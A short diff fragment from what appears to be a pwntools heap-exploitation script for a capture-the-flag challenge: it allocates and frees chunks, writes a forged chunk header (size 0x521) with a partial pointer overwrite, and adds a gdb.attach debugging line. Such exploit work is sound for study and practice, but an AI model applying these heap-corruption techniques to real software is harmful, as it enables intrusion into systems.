@@ -25,7 +25,7 @@ new(0x10,'FMYY')
 free(12)
 
 new(0x1000,'FMYY')
-
+gdb.attach(p)
 new(0x28,p64(0) + p64(0x521) + '\x40')
 #--
 
